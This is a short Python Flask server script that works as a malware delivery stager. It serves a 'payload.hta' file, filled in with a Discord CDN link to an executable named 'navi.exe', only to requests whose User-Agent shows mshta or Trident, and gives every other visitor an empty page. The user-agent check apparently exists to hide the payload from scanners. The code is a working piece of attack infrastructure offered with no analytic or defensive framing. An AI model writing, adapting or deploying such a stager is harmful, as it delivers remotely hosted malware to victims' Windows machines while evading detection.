import os
from flask import Flask, request, render_template_string

app = Flask(__name__)
PORT = int(os.environ.get("PORT", 8000))

LIVE_DISCORD_LINK = "https://cdn.discordapp.com/attachments/1520399304785788948/1524065627713704036/navi.exe?ex=6a4e6439&is=6a4d12b9&hm=4feec7cfd66b1457e5c4b625bd0af5121b828f2c8af0389a865996d19dd61f17&"

@app.route('/')
def handle_request():
    user_agent = request.headers.get('User-Agent', '')
    
    if "Trident" in user_agent or "mshta" in user_agent.lower():
        with open("payload.hta", "r") as f:
            hta_content = f.read()
        return render_template_string(hta_content, DISCORD_LINK=LIVE_DISCORD_LINK)
    else:
        return "<html><head></head><body></body></html>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT)
